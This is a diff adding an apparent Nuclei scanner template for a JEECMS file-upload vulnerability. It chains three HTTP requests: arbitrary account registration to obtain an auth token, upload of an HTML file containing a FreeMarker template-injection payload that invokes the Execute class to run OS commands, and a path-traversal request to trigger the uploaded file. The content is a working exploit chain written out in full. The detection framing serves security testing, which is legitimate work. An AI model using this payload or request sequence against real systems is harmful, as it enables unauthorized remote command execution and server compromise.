@@ -1,0 +1,87 @@
+id: jeecms-file-upload
+
+info:
+  name: JEECMS o_upload File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    JEECMS is a content management system (CMS) developed by China Jinlei Technology Development Corporation using Java language. There is a security vulnerability in JEECMS, an attacker can register any account and upload a malicious file through the /member/upload/o_upload endpoint to obtain server permissions.
+  tags: file-upload
+
+variables:
+  rand_name: '{{rand_base(6)}}'
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: step1-authentication
+    method: POST
+    path:
+      - '{{BaseURL}}/thirdParty/bind'
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "username": "{{rand_name}}",
+        "loginWay": 1,
+        "loginType": "QQ",
+        "thirdId": "{{rand_name}}"
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '"JEECMS-Auth-Token":"([a-zA-Z0-9]+)"'
+    extractors:
+      - type: regex
+        name: auth_token
+        regex:
+          - '"JEECMS-Auth-Token":"([a-zA-Z0-9]+)"'
+        group: 1
+
+  - id: step2-file-upload
+    method: POST
+    path:
+      - '{{BaseURL}}/member/upload/o_upload'
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------1250178961143214655620108952
+      JEECMS-Auth-Token: '{{auth_token}}'
+    body: |
+      -----------------------------1250178961143214655620108952
+      Content-Disposition: form-data; name="uploadFile"; filename="a.html"
+      Content-Type: text/html
+      
+      ${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
+      -----------------------------1250178961143214655620108952
+      Content-Disposition: form-data; name="typeStr"
+      
+      File
+      -----------------------------1250178961143214655620108952--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '"fileUrl":"(.*?)\.html"'
+    extractors:
+      - type: regex
+        name: file_url
+        regex:
+          - '"fileUrl":"(.*?)\.html"'
+        group: 1
+
+  - id: step3-file-execution
+    method: GET
+    path:
+      - '{{BaseURL}}/../../../../{{replace(file_url, "/", "-")}}.htm'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'freemarker标签'
